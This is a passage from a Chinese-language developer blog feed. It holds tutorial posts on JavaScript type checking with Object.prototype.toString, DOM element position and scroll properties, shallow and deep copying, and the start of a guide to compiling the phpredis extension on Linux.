undefined</td></tr><tr><td>null</td><td>null.toString()</td><td>Uncaught TypeError: Cannot read property ‘toString’ of null</td></tr><tr><td>String</td><td>String.toString()</td><td>“function String() { [native code] }”</td></tr><tr><td>Number</td><td>Number.toString()</td><td>“function Number() { [native code] }”</td></tr><tr><td>Boolean</td><td>Boolean.toString()</td><td>“function Boolean() { [native code] }”</td></tr><tr><td>Array</td><td>Array.toString()</td><td>“function Array() { [native code] }”</td></tr><tr><td>Function</td><td>Function.toString()</td><td>“function Function() { [native code] }”</td></tr><tr><td>Date</td><td>Date.toString()</td><td>“function Date() { [native code] }”</td></tr><tr><td>RegExp</td><td>RegExp.toString()</td><td>“function RegExp() { [native code] }”</td></tr><tr><td>Error</td><td>Error.toString()</td><td>“function Error() { [native code] }”</td></tr><tr><td>Promise</td><td>Promise.toString()</td><td>“function Promise() { [native code] }”</td></tr><tr><td>Obejct</td><td>Object.toString()</td><td>“function Object() { [native code] }”</td></tr><tr><td>Math</td><td>Math.toString()</td><td>“[object Math]“</td></tr></tbody></table><p>那如果我们想强制让某一对象调用 <code>Object.prototype.toString()</code> 方法会发生什么呢？我们使用 <code>call</code> 来改写方法中的 <code>this</code> 可以达到这一效果：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num = <span class="number">123</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(num)); <span class="comment">// &#x27;[Object Number]&#x27;</span></span><br></pre></td></tr></table></figure><p>可以发现通过借助 <code>Object.prototype.toString()</code> 我们可以获取到调用对象的类型，这一点非常有用，可以帮助我们接下来进行类型判断。</p><h3 id="内部原理-1"><a href="#内部原理-1" class="headerlink" title="内部原理"></a>内部原理</h3><p>在编写类型判断的方法之前，我们不妨来看一下 <code>Object.prototype.toString</code> 到底做了什么，在不同的 ES 版本中，该方法会有一定的区别：</p><p>ES5 环境下：</p><ul><li>如果<strong>this</strong>的值为<strong>undefined</strong>,则返回<code>&quot;[object Undefined]&quot;</code>.</li><li>如果<strong>this</strong>的值为<strong>null</strong>,则返回<code>&quot;[object Null]&quot;</code>.</li><li>让<em>O</em>成为调用ToObject(<strong>this</strong>)的结果.</li><li>让<em>class</em>成为<em>O</em>的内部属性[[Class]]的值.</li><li>返回三个字符串<strong>“[object “,</strong> <em>class</em>, 以及 <strong>“]“</strong>连接后的新字符串.</li></ul><p>ES6 环境下：</p><ul><li>如果<strong>this</strong>的值为<strong>undefined</strong>,则返回<code>&quot;[object Undefined]&quot;</code>.</li><li>如果<strong>this</strong>的值为<strong>null</strong>,则返回<code>&quot;[object Null]&quot;</code>.</li><li>让<em>O</em>成为调用ToObject(<strong>this</strong>)的结果.</li><li>如果<em>O</em>有[[NativeBrand]]内部属性,让<em>tag</em>成为表29中对应的值.</li><li>否则<ol><li>让<em>hasTag</em>成为调用<em>O</em>的[[HasProperty]]内部方法后的结果,参数为@@toStringTag.</li><li>如果<em>hasTag</em>为<strong>false</strong>,则让<em>tag</em>为<code>&quot;Object&quot;</code>.</li><li>否则,<ol><li>让<em>tag</em>成为调用<em>O</em>的[[Get]]内部方法后的结果,参数为@@toStringTag.</li><li>如果<em>tag</em>是一个abrupt completion,则让<em>tag</em>成为NormalCompletion(<code>&quot;???&quot;</code>).</li><li>让<em>tag<em>成为</em>tag</em>.[[value]].</li><li>如果Type(<em>tag</em>)不是字符串,则让<em>tag成为</em><code>&quot;???&quot;</code>.</li><li>如果<em>tag</em>的值为<code>&quot;Arguments&quot;</code>, <code>&quot;Array&quot;</code>, <code>&quot;Boolean&quot;</code>, <code>&quot;Date&quot;</code>, <code>&quot;Error&quot;</code>, <code>&quot;Function&quot;</code>, <code>&quot;JSON&quot;</code>, <code>&quot;Math&quot;</code>, <code>&quot;Number&quot;</code>, <code>&quot;Object&quot;</code>, <code>&quot;RegExp&quot;</code>,<code>或者&quot;String&quot;中的任一个,则让</code><em>tag</em>成为字符串<code>&quot;~&quot;和</code><em>tag</em>当前的值连接后的结果.</li></ol></li></ol></li><li>返回三个字符串”[object “, tag, and “]“连接后的新字符串.</li></ul><h3 id="封装一个类型判断的方法"><a href="#封装一个类型判断的方法" class="headerlink" title="封装一个类型判断的方法"></a>封装一个类型判断的方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">type</span> (data)&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable language_">arguments</span>.<span class="property">length</span> === <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&#x27;type方法未传参&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> typeStr = <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(data);</span><br><span class="line">  <span class="keyword">return</span> typeStr.<span class="title function_">match</span>(<span class="regexp">/\[object (.*?)\]/</span>)[<span class="number">1</span>].<span class="title function_">toLowerCase</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>元素位置、浏览器窗口、滚动条的种种问题整理</title>
      <link href="/2019/12/87a4563a30e6.html"/>
      <url>/2019/12/87a4563a30e6.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-元素位置与大小"><a href="#1-元素位置与大小" class="headerlink" title="1. 元素位置与大小"></a>1. 元素位置与大小</h1><h2 id="1-1-Element-client-xxx"><a href="#1-1-Element-client-xxx" class="headerlink" title="1.1 Element.client[xxx]"></a>1.1 Element.client[xxx]</h2><blockquote><p>获取元素不含边框的宽高，以及上方与左方边框的宽度。</p></blockquote><blockquote><p>此属性会将获取的值四舍五入取整数。如果你需要小数结果，请使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/getBoundingClientRect"><code>element.getBoundingClientRect()</code></a>。</p></blockquote><p>在每个 Element 元素身上都挂载这一个 <code>client[xxx]</code> 的属性，其表示的意义为：</p><ul><li><code>Element.clientWidth/clientHeight</code> 表示元素的 Padding 与 Content 的宽度（高度）相加，如果使用了 CSS 的 <code>box-sizing</code> 属性改变了盒模型，那么所计算的仍然是 Padding 与 Content 的宽度（高度），只不过 Content 的宽高会由于盒模型的变更而减小，<strong>需要注意的是获取的宽高不包含滚动条的宽高</strong>。</li><li><code>Element.clientLeft/clientTop</code> 表示元素左（上）边框的宽度。如果元素的文本方向是从右向左（RTL, right-to-left），并且由于内容溢出导致左边出现了一个垂直滚动条，则该属性包括滚动条的宽度。</li></ul><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202405082035869.png" alt="202405082035869.png|560"></p><blockquote><p>如果元素有滚动条，那么滚动条会挤占 Padding 区域的宽高，因此 Padding 区域会变大，Content 区域会变小。</p></blockquote><h2 id="1-2-HTMLElement-offset-xxx"><a href="#1-2-HTMLElement-offset-xxx" class="headerlink" title="1.2 HTMLElement.offset[xxx]"></a>1.2 HTMLElement.offset[xxx]</h2><blockquote><p>获取元素包含边框（以及滚动条）的宽高，以及获取元素相对于父级定位元素的位置。</p></blockquote><blockquote><p>此属性会将获取的值四舍五入取整数。如果你需要小数结果，请使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/getBoundingClientRect"><code>element.getBoundingClientRect()</code></a>。</p></blockquote><p>每一个 Element 元素神挡都挂载着一个 <code>offset[xxx]</code> 属性，其表示的意义为：</p><ul><li><p><code>HTMLElement.offsetHeight/offsetWidth</code> 是一个只读属性，它返回该元素的像素高度（宽度），高度包含该元素的垂直内边距、边框、以及滚动条宽度（Content + Padding + Border + ScrollBar），且是一个整数。</p><p>TIPS: 在这里要补充一点，当水平方向出现滚动条时，Content 的宽度会被缩减去滚动条的宽度，以保证元素整体的宽度不改变。</p></li><li><p><code>HTMLElement.offsetTop/offsetLeft</code> 为只读属性，它返回当前元素从 offsetParent 元素的顶部（左边）内边距到元素边框的距离。</p><p>TIPS: <code>Element.offsetParent</code> 即为获取当前元素的父级定位元素。当某一元素的父级元素没有经过定位时，<code>offsetParent</code> 指向 <code>&lt;body&gt;&lt;/body&gt;</code>。特殊情况下，定位为 <code>fixed</code> 的元素的 offsetParent 为 null，其 <code>offsetTop/offsetLeft</code> 属性在此时代指元素距离窗口顶部（左边）的距离。</p></li></ul><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202405082059793.png" alt="202405082059793.png|560"></p><h2 id="1-3-Element-getBoundingClientRect"><a href="#1-3-Element-getBoundingClientRect" class="headerlink" title="1.3 Element.getBoundingClientRect()"></a>1.3 Element.getBoundingClientRect()</h2><blockquote><p>获取元素相对于视口的位置信息。</p></blockquote><p><code>Element.getBoundingClientRect()</code> 返回的是一个 DOMReact 对象，在 Chrome 中，其值有以下几个属性：</p><ul><li><code>x</code>: 元素相对于浏览器视口左上角 x 轴的距离（IE 不支持）；</li><li><code>y</code>: 元素相对于浏览器视口左上角 y 轴的距离（IE 不支持）；</li><li><code>left</code>: 元素左边相对于浏览器视口左边的距离；</li><li><code>right</code>: 元素右边相对于浏览器视口左边的距离；</li><li><code>top</code>: 元素顶部相对于浏览器视口顶部的距离；</li><li><code>bottom</code>: 元素底部相对于浏览器视口顶部的距离。</li></ul><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202405082111394.png" alt="|560"></p><blockquote><p>当计算边界矩形时，会考虑视口区域（或其他可滚动元素）内的滚动操作，也就是说，当滚动位置发生了改变，top和left属性值就会随之立即发生变化（因此，它们的值是相对于视口的，而不是绝对的）。如果你需要获得相对于整个网页左上角定位的属性值，那么只要给top、left属性值加上当前的滚动位置（通过window.scrollX和window.scrollY），这样就可以获取与当前的滚动位置无关的值。同时为了跨浏览器兼容，请使用 window.pageXOffset 和 window.pageYOffset 代替 window.scrollX 和 window.scrollY。</p></blockquote><blockquote><p>还有一个 Element.getClientRects() 的接口，区别是 <code>getClientRects()</code> 获取行级元素是，如果元素折行，会将其按行分割成多个 Rect 对象。</p></blockquote><h2 id="1-4-window-innerWidth-innerHeight"><a href="#1-4-window-innerWidth-innerHeight" class="headerlink" title="1.4 window.innerWidth/innerHeight"></a>1.4 window.innerWidth/innerHeight</h2><p>如果想要计算浏览器窗口的宽度或者高度，<code>window</code> 上拥有一个独有的属性 <code>innerHeight</code> 与 <code>innerWidth</code>，分别用来获取窗口的高度与宽度。</p><p>在开发者模式下，我们拖动浏览器视口变化时，视口右上角的数字显示的就是 <code>window.innerHeight</code> 与 <code>window.innerWidth</code> 的数值：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202405082114800.png" alt=""></p><p>同时对于移动设备来说，使用 <code>innerWidth</code> 也可以获取到当前移动设备视口的宽度（注意是实际像素而并非物理像素）。这里要提一点，如果我们没有设置 mata 标签，视口以默认的 980px 去渲染页面时，那么当前的 <code>innerWidth</code> 的宽度输出结果是 <code>980</code>。当我们设置了 mata 标签，并将视口宽度设置为设备宽度（<code>content=&quot;width=device-width, initial-scale=1.0&quot;</code>），那么所得到的 <code>innerWidth</code> 才是当前设备的设备宽度。</p><p><img src="https://i.loli.net/2019/12/23/IpAGFqcZgRMD5nT.png" alt="设置了 mata 标签的 width"></p><h1 id="2-Scroll"><a href="#2-Scroll" class="headerlink" title="2. Scroll"></a>2. Scroll</h1><h2 id="2-1-window-上-scroll-相关的属性与方法"><a href="#2-1-window-上-scroll-相关的属性与方法" class="headerlink" title="2.1 window 上 scroll 相关的属性与方法"></a>2.1 window 上 scroll 相关的属性与方法</h2><h3 id="window-scroll-scrollTo-scrollBy"><a href="#window-scroll-scrollTo-scrollBy" class="headerlink" title="window.scroll / scrollTo / scrollBy"></a>window.scroll / scrollTo / scrollBy</h3><p><code>window.scroll()</code> 方法与 <code>window.scrollTo()</code> 方法相同，都是将页面滚动到某一坐标，可以不实用 <code>window</code> 直接在全局调用：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">scrollTo</span>(<span class="number">0</span>, <span class="number">100</span>)</span><br></pre></td></tr></table></figure><p>同时部分浏览器是原生支持平滑滚动的，通过配置的方式，可以添加平滑滚动的参数（Firefox、Chrom、Opera 以及除了 Safari Mobile 之外的其他主流移动端浏览器）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">scroll</span>(&#123;</span><br><span class="line">  <span class="attr">top</span>: <span class="number">100</span>,</span><br><span class="line">  <span class="attr">left</span>: <span class="number">100</span>,</span><br><span class="line">  <span class="attr">behavior</span>: <span class="string">&#x27;smooth&#x27;</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="window-scrollX-scrollY"><a href="#window-scrollX-scrollY" class="headerlink" title="window.scrollX / scrollY"></a>window.scrollX / scrollY</h3><p>获取窗口滚动的 X 轴的距离或者 Y 轴的距离。</p><p>同时 <code>pageX[Y]Offset</code> 属性是 <code>scrollX[Y]</code> 属性的别名，为了跨浏览器兼容性，请使用 window.pageXOffset 代替 window.scrollX。另外，旧版本的 IE（&lt;9）两个属性都不支持，必须通过其他的非标准属性来解决此问题。完整的兼容性代码如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = (<span class="variable language_">window</span>.<span class="property">pageXOffset</span> !== <span class="literal">undefined</span>) ? <span class="variable language_">window</span>.<span class="property">pageXOffset</span> : (<span class="variable language_">document</span>.<span class="property">documentElement</span> || <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">parentNode</span> || <span class="variable language_">document</span>.<span class="property">body</span>).<span class="property">scrollLeft</span>;</span><br><span class="line"><span class="keyword">var</span> y = (<span class="variable language_">window</span>.<span class="property">pageYOffset</span> !== <span class="literal">undefined</span>) ? <span class="variable language_">window</span>.<span class="property">pageYOffset</span> : (<span class="variable language_">document</span>.<span class="property">documentElement</span> || <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">parentNode</span> || <span class="variable language_">document</span>.<span class="property">body</span>).<span class="property">scrollTop</span>;</span><br></pre></td></tr></table></figure><h2 id="2-2-Element-上-scroll-相关的属性与方法"><a href="#2-2-Element-上-scroll-相关的属性与方法" class="headerlink" title="2.2 Element 上 scroll 相关的属性与方法"></a>2.2 Element 上 scroll 相关的属性与方法</h2><h3 id="Element-scrollTop"><a href="#Element-scrollTop" class="headerlink" title="Element.scrollTop"></a>Element.scrollTop</h3><p>如果一个元素内存在滚动条，使用 <code>Element.scrollTop</code> 可以过去到该元素已滚动的距离，如果该元素没有滚动条，该值为 0。</p><blockquote><p>与之对应的还有 Element.scrollLeft</p></blockquote><h3 id="Element-scrollHeight"><a href="#Element-scrollHeight" class="headerlink" title="Element.scrollHeight"></a>Element.scrollHeight</h3><p>Element.scrollHeight 这个只读属性是一个元素内容高度的度量，包括由于溢出导致的视图中不可见内容。scrollHeight 的值等于该元素在不使用滚动条的情况下为了适应视口中所用内容所需的最小高度。 </p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/202405082118895.png" alt=""></p><blockquote><p>与之对应的还有 Element.scroolWidth</p></blockquote><h1 id="3-例题"><a href="#3-例题" class="headerlink" title="3. 例题"></a>3. 例题</h1><h2 id="3-1-实现可拖拽-Div"><a href="#3-1-实现可拖拽-Div" class="headerlink" title="3.1 实现可拖拽 Div"></a>3.1 实现可拖拽 Div</h2><p>通过事件对象 e 获取到鼠标从点击开始到实时位置的偏移量，然后与元素的位置相累加，得出元素的实时位置。</p><p><a href="https://codepen.io/EsunR/pen/JjoyWap">https://codepen.io/EsunR/pen/JjoyWap</a></p><blockquote><p>还可以使用 HTML5 的拖拽事件实现</p></blockquote><h2 id="3-2-判断元素是否在浏览器显示范围内"><a href="#3-2-判断元素是否在浏览器显示范围内" class="headerlink" title="3.2 判断元素是否在浏览器显示范围内"></a>3.2 判断元素是否在浏览器显示范围内</h2><p>通过 <code>Element.getBoundingClientRect().top</code> 获取元素位置到窗口顶部的距离，又可以通过 <code>window.innerHeight</code> 获取到窗口的高度，通过以下两个判断即可获取到元素的位置状态：</p><ul><li>如果元素到顶部的距离小于窗口的高度，说明元素进入了浏览器窗口</li><li>如果元素到顶部的距离加上元素本身的高度为负值，那么说明元素已经离开了窗口的可视范围</li></ul><p><a href="https://codepen.io/EsunR/pen/dyPzvxQ">https://codepen.io/EsunR/pen/dyPzvxQ</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript浅拷贝与深拷贝</title>
      <link href="/2019/12/40e17ab89731.html"/>
      <url>/2019/12/40e17ab89731.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-回顾"><a href="#1-回顾" class="headerlink" title="1. 回顾"></a>1. 回顾</h1><p>JavaScript中有6种数据类型：数字（number）、字符串（string）、布尔值（boolean）、undefined、null、对象（Object）。其中对象类型包括：数组（Array）、函数（Function）、还有两个特殊的对象：正则（RegExp）和日期（Date）。</p><p>对于引用类型来说其存放于堆内存，当其被做一个 LSH 引用时，其只是引用了堆内存的地址，而并非跟值类型的数据一样开辟一块新内存，所以如果想要拷贝引用类型的数据往往比较繁琐，数组、函数、对象、Map 都属于引用类型。</p><h1 id="2-浅拷贝"><a href="#2-浅拷贝" class="headerlink" title="2. 浅拷贝"></a>2. 浅拷贝</h1><p>浅拷贝相当于仅对最外层元素做了拷贝，假如对象中的某个值仍是一个引用类型的值，那么嵌套的这个引用类型将不会被拷贝。</p><p>数组的浅拷贝可以使用 <code>slice()</code> 来实现，而对象的浅拷贝可以通过遍历对象实现，也可以通过 <code>Object.assign</code> 来实现：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">simpleCopy</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> <span class="title class_">Array</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> obj.<span class="title function_">slice</span>();</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (obj <span class="keyword">instanceof</span> <span class="title class_">Object</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, obj);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> obj</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="3-深拷贝"><a href="#3-深拷贝" class="headerlink" title="3. 深拷贝"></a>3. 深拷贝</h1><p>为了弥补浅拷贝的缺点，那么我们就需要对元素进行深拷贝，最简单粗暴的方式就是使用 <code>JSON.stringify()</code> 这个方式来将对象转换为字符串，再通过 <code>JSON.parse()</code> 来转换。但是这样的话 <code>undefined</code> 就会被忽略掉，同时原型链也会丢失，举一个简单的例子：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Dog</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title class_">Dog</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">brak</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;wangwangwang&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">  <span class="attr">a</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">b</span>: &#123;</span><br><span class="line">    <span class="attr">c</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">d</span>: <span class="number">3</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">e</span>: <span class="literal">undefined</span>,</span><br><span class="line">  <span class="attr">f</span>: <span class="literal">null</span>,</span><br><span class="line">  <span class="attr">g</span>: <span class="keyword">new</span> <span class="title class_">Dog</span>(<span class="string">&quot;huahua&quot;</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> newObj = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(obj));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;newObj: &quot;</span>, newObj);</span><br><span class="line">newObj.<span class="property">g</span>.<span class="title function_">brak</span>();</span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">newObj</span>:  &#123; <span class="attr">a</span>: <span class="number">1</span>, <span class="attr">b</span>: &#123; <span class="attr">c</span>: <span class="number">2</span>, <span class="attr">d</span>: <span class="number">3</span> &#125;, <span class="attr">f</span>: <span class="literal">null</span>, <span class="attr">g</span>: &#123; <span class="attr">name</span>: <span class="string">&#x27;huahua&#x27;</span> &#125; &#125;</span><br><span class="line"><span class="title class_">TypeError</span>: newObj.<span class="property">g</span>.<span class="property">brak</span> is not a <span class="keyword">function</span></span><br></pre></td></tr></table></figure><p>为了解决这个问题，我们可以使用递归来解决，只要判断每一个值如果是 <code>Object</code> 类型，就对其递归进行深拷贝。如下的深拷贝即可实现对原型链方法的拷贝：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">deepClone</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> newObj;</span><br><span class="line">  <span class="comment">// 获取该对象的类型,如 Function、Array 等</span></span><br><span class="line">  <span class="keyword">let</span> type = <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">toString</span>.<span class="title function_">call</span>(obj).<span class="title function_">slice</span>(<span class="number">8</span>, -<span class="number">1</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;type: &#x27;</span>, type);</span><br><span class="line">  <span class="keyword">if</span> (type === <span class="string">&quot;Array&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果深拷贝的对象是一个数组，初始化这个数组</span></span><br><span class="line">    newObj = [];</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type === <span class="string">&quot;Object&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果深拷贝的对象是一个普通对象</span></span><br><span class="line">    newObj = &#123;&#125;;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 如果被拷贝的对象既不是 Array 也不是 Object，那么就说明其可能是 Function、RegExp、Date 这种特殊类型，直接返回原值</span></span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="keyword">if</span> (obj[key] <span class="keyword">instanceof</span> <span class="title class_">Object</span>) &#123;</span><br><span class="line">      <span class="comment">// 如果当前 key 的值是一个 Object 类型，就对该对象进行递归调用</span></span><br><span class="line">      newObj[key] = <span class="title function_">deepClone</span>(obj[key]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      newObj[key] = obj[key];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> newObj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>世界上最好的语言 Linux 环境下安装与启用扩展指南</title>
      <link href="/2019/12/f537f6142dcd.html"/>
      <url>/2019/12/f537f6142dcd.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-薛定谔的-PHP"><a href="#1-薛定谔的-PHP" class="headerlink" title="1. 薛定谔的 PHP"></a>1. 薛定谔的 PHP</h1><p>当你使用一台 Linux 设备时，你永远不知道你的设备上被安装了多少个 PHP 的版本，也不会知道当前的 PHP 设置是什么，关于 PHP 的多版本管理与信息查看可以查看 <a href="https://blog.esunr.site/2019/12/PHP%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E6%8C%87%E5%BC%95/">这篇文章的末尾</a>。只有你搞明白了 PHP 的版本如何管理你才能顺滑的安装 PHP 的各种插件。</p><p><strong>踩坑预警：</strong> 如果你的插件没有生效，请依次检查</p><ol><li>在 <code>php.ini</code> 中是否启用该插件；</li><li>当前环境（命令行 or Apache）下的 <code>php.ini</code> 目录；</li><li>扩展的路径（extension_dir）；</li><li><code>php7.x-dev</code> 安装的版本是否是当前环境的版本；</li><li>重新审视所有的操作与你自己的人生。</li></ol><p>以下所有流程都建立于 <strong>当前环境下仅安装了一个 PHP 版本，并且假定 PHP 版本为 7.3</strong> ，以安装一个 <code>phpredis</code> 插件为示例演示。</p><h1 id="2-下载-phpredis-源码"><a href="#2-下载-phpredis-源码" class="headerlink" title="2. 下载 phpredis 源码"></a>2. 下载 phpredis 源码</h1><p>打开 <code>phpredis</code> 的<a href="https://github.com/phpredis/phpredis">版本发布地址</a>，获取最新版本的 <code>tar.gz</code> 格式的下载链接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/phpredis/phpredis/archive/5.1.1.tar.gz</span><br></pre></td></tr></table></figure><p>移动到一个你能找到的目录下，如 <code>/usr/src</code> ，运行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget https://github.com/phpredis/phpredis/archive/5.1.1.tar.gz</span><br></pre></td></tr></table></figure><p>之后解压源码文件，并进入该目录：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tar xvzf phpredis-xxx.tar.gz</span><br><span class="line">$ <span class="built_in">cd</span> phpredis-xxx.tar.gz</span><br></pre></td></tr></table></figure><h1 id="3-安装-phpredis"><a href="#3-安装-phpredis" class="headerlink" title="3. 安装 phpredis"></a>3. 安装 phpredis</h1><p><a href="https://github.com/phpredis/phpredis/blob/develop/INSTALL.markdown">官方安装文档</a></p><p>下载下来的源码还未经过编译，官方文档提供了简单的三步走策略：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ phpize</span><br><span class="line">$ ./configure [--enable-redis-igbinary] [--enable-redis-msgpack] [--enable-redis-lzf [--with-liblzf[=DIR]]] [--enable-redis-zstd]</span><br><span class="line">$ make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>我们一步步看，如果运行 <code>phpize</code> 错误，我们就需要安装当前 php 的 dev 版本才能获取到编译工具，<strong>安装的版本必须为当前PHP环境的版本</strong>，以 php7.3 为例：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ apt-get install php7.3-dev</span><br></pre></td></tr></table></figure><p>之后再运行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ phpize</span><br></pre></td></tr></table></figure><p>等待完成后，需要再执行 <code>./configure</code> ，这条指令后面可以加一个参数 <code>--with-php-config</code> ，代表当前的 php 